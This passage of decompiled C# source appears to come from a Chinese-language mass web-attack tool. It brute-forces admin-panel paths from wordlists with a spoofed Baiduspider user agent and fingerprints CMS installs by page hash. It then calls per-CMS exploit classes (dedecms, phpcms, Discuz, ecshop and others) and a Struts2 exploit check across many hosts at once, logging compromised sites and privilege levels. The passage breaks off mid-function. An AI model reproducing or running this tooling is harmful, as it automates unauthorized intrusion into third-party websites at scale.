								text2 = text2.Substring(20, text2.Length - 20);
							}
							int wangzhijieshu = text2.IndexOf("/");
							int biaotikaishi = text2.IndexOf(">");
							int biaotijieshu = text2.IndexOf("</a>");
							string wangzhi = text2.Substring(0, wangzhijieshu);
							string biaoti = text2.Substring(biaotikaishi + 1, biaotijieshu - biaotikaishi - 1);
							if (!this.listBox2.Items.Contains(wangzhi + "  " + biaoti))
							{
								this.listBox2.Items.Add(wangzhi + "  " + biaoti);
							}
						}
						catch
						{
							this.cduanjishu++;
							this.houtaiSetTextc(this.cduanjishu * 100 / this.cduanzongshu);
						}
					}
				}
			}
			catch
			{
				this.cduanjishu++;
				this.houtaiSetTextc(this.cduanjishu * 100 / this.cduanzongshu);
			}
		}
		private void EndScanAdmin(IAsyncResult arResult)
		{
			GC.Collect();
		}
		public void fuwuqishibie(string txt)
		{
			try
			{
				WebClient cli = new WebClient();
				cli.DownloadString("http://" + txt);
				string sss = cli.ResponseHeaders.ToString();
				string kaishi = sss.Substring(sss.IndexOf("Server:") + 8, 40);
				string jieshu = kaishi.Substring(0, kaishi.IndexOf("\r\n"));
				string kaishi2 = sss.Substring(sss.IndexOf("Powered-By:") + 12, 40);
				string jieshu2 = kaishi2.Substring(0, kaishi2.IndexOf("\r\n"));
				this.label35.Text = jieshu;
				this.label36.Text = jieshu2;
			}
			catch
			{
				MessageBox.Show("服务器无法识别！");
			}
		}
		private void EndScancms(IAsyncResult arResult)
		{
			GC.Collect();
		}
		private void scan_admin()
		{
			for (int i = 0; i < this.listBox3.Items.Count; i++)
			{
				string urls = this.listBox3.Items[i].ToString();
				ThreadPool.SetMaxThreads(35, 35);
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Scan_youhua), urls);
			}
		}
		private void scan_cms()
		{
			try
			{
				for (int i = 0; i < this.listBox7.Items.Count; i++)
				{
					string urls = this.listBox7.Items[i].ToString();
					ThreadPool.SetMaxThreads(250, 250);
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Scan_cmsshibie), urls);
				}
			}
			catch
			{
				MessageBox.Show("软件运行错误！");
			}
		}
		public void Scan_youhua(object url)
		{
			string aa = this.textBox5.Text;
			string peizhihoutaiscan = Settings.Default.HoutaiScan;
			if (peizhihoutaiscan == "1")
			{
				string my_scanUrl = "http://" + url;
				Regex reg = new Regex("\\r\\n");
				string[] bbn = reg.Split(aa);
				this.houtaijishuzongshu = this.listBox3.Items.Count;
				for (int zidingyi = 0; zidingyi < bbn.Length; zidingyi++)
				{
					try
					{
						string tingzhi = Settings.Default.HoutaiIsStop;
						if (tingzhi == "1")
						{
							Thread.CurrentThread.Abort();
						}
						this.label20.Text = url + bbn[zidingyi].ToString();
						HttpWebRequest WebReqScan = (HttpWebRequest)WebRequest.Create(new Uri(my_scanUrl + bbn[zidingyi].ToString()));
						WebReqScan.Timeout = 500;
						WebReqScan.UserAgent = "Baiduspider";
						HttpWebResponse WebRepScan = (HttpWebResponse)WebReqScan.GetResponse();
						if (WebRepScan.StatusCode != HttpStatusCode.NotFound)
						{
							this.gaibian++;
							if (my_scanUrl + bbn[zidingyi].ToString() == WebRepScan.ResponseUri.ToString() && my_scanUrl + bbn[zidingyi].ToString() == WebRepScan.ResponseUri.ToString() && WebRepScan.ContentLength > 0L)
							{
								ListViewItem item = new ListViewItem();
								item.Text = (this.listView2.Items.Count + 1).ToString();
								item.SubItems.Add(my_scanUrl + bbn[zidingyi].ToString());
								item.SubItems.Add("状态200");
								string baohan = "0";
								for (int i9 = 0; i9 < this.listView2.Items.Count; i9++)
								{
									string aaa = this.listView2.Items[i9].SubItems[1].Text;
									if (aaa == WebRepScan.ResponseUri.ToString())
									{
										baohan = "1";
									}
								}
								if (baohan == "0" && !this.listView1.Items.Contains(item))
								{
									this.listView2.Items.Add(item);
								}
							}
						}
					}
					catch
					{
					}
					this.houtaijishu++;
					this.houtaiSetTextMessage(this.houtaijishu * 100 / this.houtaijishuzongshu);
				}
				return;
			}
			string my_scanUrl2 = "http://" + url;
			string jiaoben = this.comboBox3.SelectedItem.ToString();
			StreamReader srReader;
			if (jiaoben == "all")
			{
				srReader = new StreamReader("admin.txt", Encoding.GetEncoding("GB2312"));
			}
			else
			{
				srReader = new StreamReader(jiaoben + ".txt", Encoding.GetEncoding("GB2312"));
			}
			long cuowufanhui = 0L;
			try
			{
				HttpWebRequest WebReqScan2 = (HttpWebRequest)WebRequest.Create(new Uri(my_scanUrl2 + "/nimanismsjsmnksmjsnsghjsbhs.asp"));
				WebReqScan2.Timeout = 500;
				this.label20.Text = url + "/nimanismsjsmnksmjsnsghjsbhs.asp";
				WebReqScan2.UserAgent = "Baiduspider";
				HttpWebResponse WebRepScan2 = (HttpWebResponse)WebReqScan2.GetResponse();
				cuowufanhui = WebRepScan2.ContentLength;
			}
			catch
			{
			}
			int jishus = 0;
			if (jishus < 6)
			{
				string admin_path;
				while ((admin_path = srReader.ReadLine()) != null)
				{
					try
					{
						string houtaitingzhi = Settings.Default.HoutaiIsStop;
						if (houtaitingzhi == "1")
						{
							srReader.Close();
							Thread.CurrentThread.Abort();
						}
						HttpWebRequest WebReqScan3 = (HttpWebRequest)WebRequest.Create(new Uri(my_scanUrl2 + admin_path));
						WebReqScan3.Timeout = 500;
						this.label20.Text = url + admin_path;
						WebReqScan3.UserAgent = "Baiduspider";
						HttpWebResponse WebRepScan3 = (HttpWebResponse)WebReqScan3.GetResponse();
						if (WebRepScan3.StatusCode != HttpStatusCode.NotFound)
						{
							this.gaibian++;
							if (my_scanUrl2 + admin_path == WebRepScan3.ResponseUri.ToString() && WebRepScan3.ContentLength > 0L && WebRepScan3.ContentLength != cuowufanhui)
							{
								ListViewItem item2 = new ListViewItem();
								item2.Text = (this.listView2.Items.Count + 1).ToString();
								item2.SubItems.Add(WebRepScan3.ResponseUri.ToString());
								item2.SubItems.Add("状态200");
								string baohan2 = "0";
								for (int i10 = 0; i10 < this.listView2.Items.Count; i10++)
								{
									string aaa2 = this.listView2.Items[i10].SubItems[1].Text;
									if (aaa2 == WebRepScan3.ResponseUri.ToString())
									{
										baohan2 = "1";
									}
								}
								if (baohan2 == "0" && !this.listView2.Items.Contains(item2))
								{
									this.listView2.Items.Add(item2);
								}
							}
						}
						WebReqScan3.Abort();
						WebRepScan3.Close();
					}
					catch
					{
					}
				}
			}
			this.houtaijishu++;
			this.houtaiSetTextMessage(this.houtaijishu * 100 / this.houtaijishuzongshu);
			srReader.Close();
		}
		public void Scan_cmsshibie(object url)
		{
			string my_scanUrl = "http://" + url;
			StreamReader srReader = new StreamReader("cms.txt", Encoding.GetEncoding("GB2312"));
			Struts2 struts = new Struts2();
			string shujujieguo = struts.struts2exp(url.ToString());
			if (shujujieguo != "未做安全检测")
			{
				ListViewItem item = new ListViewItem();
				item.Text = (this.listView3.Items.Count + 1).ToString();
				item.SubItems.Add(my_scanUrl);
				item.SubItems.Add("struts2");
				item.SubItems.Add("存在struts2漏洞，权限为" + shujujieguo);
				this.DaochuGood(my_scanUrl + "|struts2|" + shujujieguo);
				this.listView3.Items.Add(item);
				GC.Collect();
			}
			int jishus = 0;
			if (jishus < 6)
			{
				string admin_path;
				while ((admin_path = srReader.ReadLine()) != null)
				{
					try
					{
						string cmstingzhi = Settings.Default.CmsIsStop;
						if (cmstingzhi == "1")
						{
							srReader.Close();
							Thread.CurrentThread.Abort();
							Settings.Default.CmsIsStop = "0";
							Settings.Default.Save();
						}
						if (admin_path != null || admin_path != "")
						{
							string[] sArray = admin_path.Split(new char[]
							{
								' '
							});
							HttpWebRequest WebReqScan = (HttpWebRequest)WebRequest.Create(new Uri(my_scanUrl + sArray[0].ToString()));
							WebReqScan.Timeout = 500;
							this.label19.Text = url + sArray[0].ToString();
							WebReqScan.UserAgent = "User-Agent\tBaiduspider";
							HttpWebResponse WebRepScan = (HttpWebResponse)WebReqScan.GetResponse();
							WebReqScan.Abort();
							WebRepScan.Close();
							if (WebRepScan.StatusCode != HttpStatusCode.NotFound)
							{
								this.gaibian++;
								if (my_scanUrl + sArray[0].ToString() == WebRepScan.ResponseUri.ToString())
								{
									string urlvb = my_scanUrl + sArray[0].ToString();
									WebClient aa = new WebClient();
									aa.Headers.Add("User-Agent", "Baiduspider");
									string sss = aa.DownloadString(urlvb);
									string shuju = FormMain.GetMD5HashHex(sss);
									FormMain.GetMD5Hash(sss);
									aa.Dispose();
									if (sArray[2].ToString() != "")
									{
										string shibiema = shuju;
										if (sArray[2].ToString() == shibiema)
										{
											if (sArray[1].ToString() == "dedecms")
											{
												dedecms decms = new dedecms();
												string exp = decms.exp(my_scanUrl);
												ListViewItem item2 = new ListViewItem();
												item2.Text = (this.listView3.Items.Count + 1).ToString();
												item2.SubItems.Add(my_scanUrl);
												item2.SubItems.Add(sArray[1].ToString());
												item2.SubItems.Add(exp);
												string baohan = "0";
												for (int i9 = 0; i9 < this.listView3.Items.Count; i9++)
												{
													string aaa = this.listView3.Items[i9].SubItems[1].Text;
													if (aaa == WebRepScan.ResponseUri.ToString())
													{
														baohan = "1";
													}
												}
												if (baohan == "0" && !this.listView3.Items.Contains(item2))
												{
													this.DaochuGood(string.Concat(new string[]
													{
														my_scanUrl,
														"|",
														sArray[1].ToString(),
														"|",
														exp
													}));
													this.listView3.Items.Add(item2);
													this.cmsjishu++;
													this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
													GC.Collect();
													Thread.CurrentThread.Abort();
												}
												this.cmsjishu++;
												this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
												return;
											}
											if (sArray[1].ToString() == "southidc")
											{
												southidc decms2 = new southidc();
												string exp2 = decms2.exp(my_scanUrl);
												ListViewItem item3 = new ListViewItem();
												item3.Text = (this.listView3.Items.Count + 1).ToString();
												item3.SubItems.Add(my_scanUrl);
												item3.SubItems.Add(sArray[1].ToString());
												item3.SubItems.Add(exp2);
												string baohan2 = "0";
												for (int i10 = 0; i10 < this.listView3.Items.Count; i10++)
												{
													string aaa2 = this.listView3.Items[i10].SubItems[1].Text;
													if (aaa2 == WebRepScan.ResponseUri.ToString())
													{
														baohan2 = "1";
													}
												}
												if (baohan2 == "0" && !this.listView3.Items.Contains(item3))
												{
													this.DaochuGood(string.Concat(new string[]
													{
														my_scanUrl,
														"|",
														sArray[1].ToString(),
														"|",
														exp2
													}));
													this.listView3.Items.Add(item3);
													this.cmsjishu++;
													this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
													GC.Collect();
													Thread.CurrentThread.Abort();
												}
												this.cmsjishu++;
												this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
												return;
											}
											if (sArray[1].ToString() == "w78cms")
											{
												w78cms decms3 = new w78cms();
												string exp3 = decms3.exp(my_scanUrl);
												ListViewItem item4 = new ListViewItem();
												item4.Text = (this.listView3.Items.Count + 1).ToString();
												item4.SubItems.Add(my_scanUrl);
												item4.SubItems.Add(sArray[1].ToString());
												item4.SubItems.Add(exp3);
												string baohan3 = "0";
												for (int i11 = 0; i11 < this.listView3.Items.Count; i11++)
												{
													string aaa3 = this.listView3.Items[i11].SubItems[1].Text;
													if (aaa3 == WebRepScan.ResponseUri.ToString())
													{
														baohan3 = "1";
													}
												}
												if (baohan3 == "0" && !this.listView3.Items.Contains(item4))
												{
													this.DaochuGood(string.Concat(new string[]
													{
														my_scanUrl,
														"|",
														sArray[1].ToString(),
														"|",
														exp3
													}));
													this.listView3.Items.Add(item4);
													this.cmsjishu++;
													this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
													GC.Collect();
													Thread.CurrentThread.Abort();
												}
												this.cmsjishu++;
												this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
												return;
											}
											if (sArray[1].ToString() == "B2Bbuilder")
											{
												B2Bbuilder decms4 = new B2Bbuilder();
												string exp4 = decms4.exp(my_scanUrl);
												ListViewItem item5 = new ListViewItem();
												item5.Text = (this.listView3.Items.Count + 1).ToString();
												item5.SubItems.Add(my_scanUrl);
												item5.SubItems.Add(sArray[1].ToString());
												item5.SubItems.Add(exp4);
												string baohan4 = "0";
												for (int i12 = 0; i12 < this.listView3.Items.Count; i12++)
												{
													string aaa4 = this.listView3.Items[i12].SubItems[1].Text;
													if (aaa4 == WebRepScan.ResponseUri.ToString())
													{
														baohan4 = "1";
													}
												}
												if (baohan4 == "0" && !this.listView3.Items.Contains(item5))
												{
													this.DaochuGood(string.Concat(new string[]
													{
														my_scanUrl,
														"|",
														sArray[1].ToString(),
														"|",
														exp4
													}));
													this.listView3.Items.Add(item5);
													this.cmsjishu++;
													this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
													GC.Collect();
													Thread.CurrentThread.Abort();
												}
												this.cmsjishu++;
												this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
												return;
											}
											if (sArray[1].ToString() == "08cms")
											{
												cms08 decms5 = new cms08();
												string exp5 = decms5.exp(my_scanUrl);
												ListViewItem item6 = new ListViewItem();
												item6.Text = (this.listView3.Items.Count + 1).ToString();
												item6.SubItems.Add(my_scanUrl);
												item6.SubItems.Add(sArray[1].ToString());
												item6.SubItems.Add(exp5);
												string baohan5 = "0";
												for (int i13 = 0; i13 < this.listView3.Items.Count; i13++)
												{
													string aaa5 = this.listView3.Items[i13].SubItems[1].Text;
													if (aaa5 == WebRepScan.ResponseUri.ToString())
													{
														baohan5 = "1";
													}
												}
												if (baohan5 == "0" && !this.listView3.Items.Contains(item6))
												{
													this.DaochuGood(string.Concat(new string[]
													{
														my_scanUrl,
														"|",
														sArray[1].ToString(),
														"|",
														exp5
													}));
													this.listView3.Items.Add(item6);
													this.cmsjishu++;
													this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
													GC.Collect();
													Thread.CurrentThread.Abort();
												}
												this.cmsjishu++;
												this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
												return;
											}
											if (sArray[1].ToString() == "5ucms")
											{
												u5ucms decms6 = new u5ucms();
												string exp6 = decms6.exp(my_scanUrl);
												ListViewItem item7 = new ListViewItem();
												item7.Text = (this.listView3.Items.Count + 1).ToString();
												item7.SubItems.Add(my_scanUrl);
												item7.SubItems.Add(sArray[1].ToString());
												item7.SubItems.Add(exp6);
												string baohan6 = "0";
												for (int i14 = 0; i14 < this.listView3.Items.Count; i14++)
												{
													string aaa6 = this.listView3.Items[i14].SubItems[1].Text;
													if (aaa6 == WebRepScan.ResponseUri.ToString())
													{
														baohan6 = "1";
													}
												}
												if (baohan6 == "0" && !this.listView3.Items.Contains(item7))
												{
													this.DaochuGood(string.Concat(new string[]
													{
														my_scanUrl,
														"|",
														sArray[1].ToString(),
														"|",
														exp6
													}));
													this.listView3.Items.Add(item7);
													this.cmsjishu++;
													this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
													GC.Collect();
													Thread.CurrentThread.Abort();
												}
												this.cmsjishu++;
												this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
												return;
											}
											if (sArray[1].ToString() == "phpcmsv9")
											{
												phpcms decms7 = new phpcms();
												string exp7 = decms7.exp(my_scanUrl);
												ListViewItem item8 = new ListViewItem();
												item8.Text = (this.listView3.Items.Count + 1).ToString();
												item8.SubItems.Add(my_scanUrl);
												item8.SubItems.Add(sArray[1].ToString());
												item8.SubItems.Add(exp7);
												string baohan7 = "0";
												for (int i15 = 0; i15 < this.listView3.Items.Count; i15++)
												{
													string aaa7 = this.listView3.Items[i15].SubItems[1].Text;
													if (aaa7 == WebRepScan.ResponseUri.ToString())
													{
														baohan7 = "1";
													}
												}
												if (baohan7 == "0" && !this.listView3.Items.Contains(item8))
												{
													this.DaochuGood(string.Concat(new string[]
													{
														my_scanUrl,
														"|",
														sArray[1].ToString(),
														"|",
														exp7
													}));
													this.listView3.Items.Add(item8);
													this.cmsjishu++;
													this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
													GC.Collect();
													Thread.CurrentThread.Abort();
												}
												this.cmsjishu++;
												this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
												return;
											}
											if (sArray[1].ToString() == "cmseasy")
											{
												cmseasy decms8 = new cmseasy();
												string exp8 = decms8.exp(my_scanUrl);
												ListViewItem item9 = new ListViewItem();
												item9.Text = (this.listView3.Items.Count + 1).ToString();
												item9.SubItems.Add(my_scanUrl);
												item9.SubItems.Add(sArray[1].ToString());
												item9.SubItems.Add(exp8);
												string baohan8 = "0";
												for (int i16 = 0; i16 < this.listView3.Items.Count; i16++)
												{
													string aaa8 = this.listView3.Items[i16].SubItems[1].Text;
													if (aaa8 == WebRepScan.ResponseUri.ToString())
													{
														baohan8 = "1";
													}
												}
												if (baohan8 == "0" && !this.listView3.Items.Contains(item9))
												{
													this.DaochuGood(string.Concat(new string[]
													{
														my_scanUrl,
														"|",
														sArray[1].ToString(),
														"|",
														exp8
													}));
													this.listView3.Items.Add(item9);
													this.cmsjishu++;
													this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
													GC.Collect();
													Thread.CurrentThread.Abort();
												}
												this.cmsjishu++;
												this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
												return;
											}
											if (sArray[1].ToString() == "Easytuan")
											{
												Easytuan decms9 = new Easytuan();
												string exp9 = decms9.exp(my_scanUrl);
												ListViewItem item10 = new ListViewItem();
												item10.Text = (this.listView3.Items.Count + 1).ToString();
												item10.SubItems.Add(my_scanUrl);
												item10.SubItems.Add(sArray[1].ToString());
												item10.SubItems.Add(exp9);
												string baohan9 = "0";
												for (int i17 = 0; i17 < this.listView3.Items.Count; i17++)
												{
													string aaa9 = this.listView3.Items[i17].SubItems[1].Text;
													if (aaa9 == WebRepScan.ResponseUri.ToString())
													{
														baohan9 = "1";
													}
												}
												if (baohan9 == "0" && !this.listView3.Items.Contains(item10))
												{
													this.DaochuGood(string.Concat(new string[]
													{
														my_scanUrl,
														"|",
														sArray[1].ToString(),
														"|",
														exp9
													}));
													this.listView3.Items.Add(item10);
													this.cmsjishu++;
													this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
													GC.Collect();
													Thread.CurrentThread.Abort();
												}
												this.cmsjishu++;
												this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
												return;
											}
											if (sArray[1].ToString() == "phpweb")
											{
												phpweb decms10 = new phpweb();
												string exp10 = decms10.exp(my_scanUrl);
												ListViewItem item11 = new ListViewItem();
												item11.Text = (this.listView3.Items.Count + 1).ToString();
												item11.SubItems.Add(my_scanUrl);
												item11.SubItems.Add(sArray[1].ToString());
												item11.SubItems.Add(exp10);
												string baohan10 = "0";
												for (int i18 = 0; i18 < this.listView3.Items.Count; i18++)
												{
													string aaa10 = this.listView3.Items[i18].SubItems[1].Text;
													if (aaa10 == WebRepScan.ResponseUri.ToString())
													{
														baohan10 = "1";
													}
												}
												if (baohan10 == "0" && !this.listView3.Items.Contains(item11))
												{
													this.DaochuGood(string.Concat(new string[]
													{
														my_scanUrl,
														"|",
														sArray[1].ToString(),
														"|",
														exp10
													}));
													this.listView3.Items.Add(item11);
													this.cmsjishu++;
													this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
													GC.Collect();
													Thread.CurrentThread.Abort();
												}
												this.cmsjishu++;
												this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
												return;
											}
											if (sArray[1].ToString() == "shopxp")
											{
												shopxp decms11 = new shopxp();
												string exp11 = decms11.shuju(my_scanUrl);
												ListViewItem item12 = new ListViewItem();
												item12.Text = (this.listView3.Items.Count + 1).ToString();
												item12.SubItems.Add(my_scanUrl);
												item12.SubItems.Add(sArray[1].ToString());
												item12.SubItems.Add(exp11);
												string baohan11 = "0";
												for (int i19 = 0; i19 < this.listView3.Items.Count; i19++)
												{
													string aaa11 = this.listView3.Items[i19].SubItems[1].Text;
													if (aaa11 == WebRepScan.ResponseUri.ToString())
													{
														baohan11 = "1";
													}
												}
												if (baohan11 == "0" && !this.listView3.Items.Contains(item12))
												{
													this.DaochuGood(string.Concat(new string[]
													{
														my_scanUrl,
														"|",
														sArray[1].ToString(),
														"|",
														exp11
													}));
													this.listView3.Items.Add(item12);
													this.cmsjishu++;
													this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
													GC.Collect();
													Thread.CurrentThread.Abort();
												}
												this.cmsjishu++;
												this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
												return;
											}
											if (sArray[1].ToString() == "Discuz")
											{
												discuz decms12 = new discuz();
												string exp12 = decms12.exp(my_scanUrl);
												ListViewItem item13 = new ListViewItem();
												item13.Text = (this.listView3.Items.Count + 1).ToString();
												item13.SubItems.Add(my_scanUrl);
												item13.SubItems.Add(sArray[1].ToString());
												item13.SubItems.Add(exp12);
												string baohan12 = "0";
												for (int i20 = 0; i20 < this.listView3.Items.Count; i20++)
												{
													string aaa12 = this.listView3.Items[i20].SubItems[1].Text;
													if (aaa12 == WebRepScan.ResponseUri.ToString())
													{
														baohan12 = "1";
													}
												}
												if (baohan12 == "0" && !this.listView3.Items.Contains(item13))
												{
													this.DaochuGood(string.Concat(new string[]
													{
														my_scanUrl,
														"|",
														sArray[1].ToString(),
														"|",
														exp12
													}));
													this.listView3.Items.Add(item13);
													this.cmsjishu++;
													this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
													GC.Collect();
													Thread.CurrentThread.Abort();
												}
												this.cmsjishu++;
												this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
												return;
											}
											if (sArray[1].ToString() == "akcms")
											{
												akcms decms13 = new akcms();
												string exp13 = decms13.exp(my_scanUrl);
												ListViewItem item14 = new ListViewItem();
												item14.Text = (this.listView3.Items.Count + 1).ToString();
												item14.SubItems.Add(my_scanUrl);
												item14.SubItems.Add(sArray[1].ToString());
												item14.SubItems.Add(exp13);
												string baohan13 = "0";
												for (int i21 = 0; i21 < this.listView3.Items.Count; i21++)
												{
													string aaa13 = this.listView3.Items[i21].SubItems[1].Text;
													if (aaa13 == WebRepScan.ResponseUri.ToString())
													{
														baohan13 = "1";
													}
												}
												if (baohan13 == "0" && !this.listView3.Items.Contains(item14))
												{
													this.DaochuGood(string.Concat(new string[]
													{
														my_scanUrl,
														"|",
														sArray[1].ToString(),
														"|",
														exp13
													}));
													this.listView3.Items.Add(item14);
													this.cmsjishu++;
													this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
													GC.Collect();
													Thread.CurrentThread.Abort();
												}
												this.cmsjishu++;
												this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
												return;
											}
											if (sArray[1].ToString() == "espcms")
											{
												espcms decms14 = new espcms();
												string exp14 = decms14.exp(my_scanUrl);
												ListViewItem item15 = new ListViewItem();
												item15.Text = (this.listView3.Items.Count + 1).ToString();
												item15.SubItems.Add(my_scanUrl);
												item15.SubItems.Add(sArray[1].ToString());
												item15.SubItems.Add(exp14);
												string baohan14 = "0";
												for (int i22 = 0; i22 < this.listView3.Items.Count; i22++)
												{
													string aaa14 = this.listView3.Items[i22].SubItems[1].Text;
													if (aaa14 == WebRepScan.ResponseUri.ToString())
													{
														baohan14 = "1";
													}
												}
												if (baohan14 == "0" && !this.listView3.Items.Contains(item15))
												{
													this.DaochuGood(string.Concat(new string[]
													{
														my_scanUrl,
														"|",
														sArray[1].ToString(),
														"|",
														exp14
													}));
													this.listView3.Items.Add(item15);
													this.cmsjishu++;
													this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
													GC.Collect();
													Thread.CurrentThread.Abort();
												}
												this.cmsjishu++;
												this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
												return;
											}
											if (sArray[1].ToString() == "shopex")
											{
												shopex decms15 = new shopex();
												string exp15 = decms15.exp(my_scanUrl);
												ListViewItem item16 = new ListViewItem();
												item16.Text = (this.listView3.Items.Count + 1).ToString();
												item16.SubItems.Add(my_scanUrl);
												item16.SubItems.Add(sArray[1].ToString());
												item16.SubItems.Add(exp15);
												string baohan15 = "0";
												for (int i23 = 0; i23 < this.listView3.Items.Count; i23++)
												{
													string aaa15 = this.listView3.Items[i23].SubItems[1].Text;
													if (aaa15 == WebRepScan.ResponseUri.ToString())
													{
														baohan15 = "1";
													}
												}
												if (baohan15 == "0" && !this.listView3.Items.Contains(item16))
												{
													this.DaochuGood(string.Concat(new string[]
													{
														my_scanUrl,
														"|",
														sArray[1].ToString(),
														"|",
														exp15
													}));
													this.listView3.Items.Add(item16);
													this.cmsjishu++;
													this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
													GC.Collect();
													Thread.CurrentThread.Abort();
												}
												this.cmsjishu++;
												this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
												return;
											}
											if (sArray[1].ToString() == "aspcms")
											{
												aspcms decms16 = new aspcms();
												string exp16 = decms16.exp(my_scanUrl);
												ListViewItem item17 = new ListViewItem();
												item17.Text = (this.listView3.Items.Count + 1).ToString();
												item17.SubItems.Add(my_scanUrl);
												item17.SubItems.Add(sArray[1].ToString());
												item17.SubItems.Add(exp16);
												string baohan16 = "0";
												for (int i24 = 0; i24 < this.listView3.Items.Count; i24++)
												{
													string aaa16 = this.listView3.Items[i24].SubItems[1].Text;
													if (aaa16 == WebRepScan.ResponseUri.ToString())
													{
														baohan16 = "1";
													}
												}
												if (baohan16 == "0" && !this.listView3.Items.Contains(item17))
												{
													this.DaochuGood(string.Concat(new string[]
													{
														my_scanUrl,
														"|",
														sArray[1].ToString(),
														"|",
														exp16
													}));
													this.listView3.Items.Add(item17);
													this.cmsjishu++;
													this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
													GC.Collect();
													Thread.CurrentThread.Abort();
												}
												this.cmsjishu++;
												this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
												return;
											}
											if (sArray[1].ToString() == "zhuangxiu")
											{
												zhuangxiu decms17 = new zhuangxiu();
												string exp17 = decms17.exp(my_scanUrl);
												ListViewItem item18 = new ListViewItem();
												item18.Text = (this.listView3.Items.Count + 1).ToString();
												item18.SubItems.Add(my_scanUrl);
												item18.SubItems.Add(sArray[1].ToString());
												item18.SubItems.Add(exp17);
												string baohan17 = "0";
												for (int i25 = 0; i25 < this.listView3.Items.Count; i25++)
												{
													string aaa17 = this.listView3.Items[i25].SubItems[1].Text;
													if (aaa17 == WebRepScan.ResponseUri.ToString())
													{
														baohan17 = "1";
													}
												}
												if (baohan17 == "0" && !this.listView3.Items.Contains(item18))
												{
													this.DaochuGood(string.Concat(new string[]
													{
														my_scanUrl,
														"|",
														sArray[1].ToString(),
														"|",
														exp17
													}));
													this.listView3.Items.Add(item18);
													this.cmsjishu++;
													this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
													GC.Collect();
													Thread.CurrentThread.Abort();
												}
												this.cmsjishu++;
												this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
												return;
											}
											if (sArray[1].ToString() == "良精南方")
											{
												ljnanfang decms18 = new ljnanfang();
												string exp18 = decms18.exp(my_scanUrl);
												ListViewItem item19 = new ListViewItem();
												item19.Text = (this.listView3.Items.Count + 1).ToString();
												item19.SubItems.Add(my_scanUrl);
												item19.SubItems.Add(sArray[1].ToString());
												item19.SubItems.Add(exp18);
												string baohan18 = "0";
												for (int i26 = 0; i26 < this.listView3.Items.Count; i26++)
												{
													string aaa18 = this.listView3.Items[i26].SubItems[1].Text;
													if (aaa18 == WebRepScan.ResponseUri.ToString())
													{
														baohan18 = "1";
													}
												}
												if (baohan18 == "0" && !this.listView3.Items.Contains(item19))
												{
													this.DaochuGood(string.Concat(new string[]
													{
														my_scanUrl,
														"|",
														sArray[1].ToString(),
														"|",
														exp18
													}));
													this.listView3.Items.Add(item19);
													this.cmsjishu++;
													this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
													GC.Collect();
													Thread.CurrentThread.Abort();
												}
												this.cmsjishu++;
												this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
												return;
											}
											if (sArray[1].ToString() == "ecshop")
											{
												ecshop decms19 = new ecshop();
												string exp19 = decms19.exp(my_scanUrl);
												ListViewItem item20 = new ListViewItem();
												item20.Text = (this.listView3.Items.Count + 1).ToString();
												item20.SubItems.Add(my_scanUrl);
												item20.SubItems.Add(sArray[1].ToString());
												item20.SubItems.Add(exp19);
												string baohan19 = "0";
												for (int i27 = 0; i27 < this.listView3.Items.Count; i27++)
												{
													string aaa19 = this.listView3.Items[i27].SubItems[1].Text;
													if (aaa19 == WebRepScan.ResponseUri.ToString())
													{
														baohan19 = "1";
													}
												}
												if (baohan19 == "0" && !this.listView3.Items.Contains(item20))
												{
													this.DaochuGood(string.Concat(new string[]
													{
														my_scanUrl,
														"|",
														sArray[1].ToString(),
														"|",
														exp19
													}));
													this.listView3.Items.Add(item20);
													this.cmsjishu++;
													this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
													GC.Collect();
													Thread.CurrentThread.Abort();
												}
												this.cmsjishu++;
												this.cmsSetTextMessage(this.cmsjishu * 100 / this.cmsjishuzongshu);
												return;
											}
											if (sArray[1].ToString() == "kesioncms")
											{
												kessionms decms20 = new kessionms();
												string exp20 = decms20.exp(my_scanUrl);
												ListViewItem item21 = new ListViewItem();
												item21.Text = (this.listView3.Items.Count + 1).ToString();
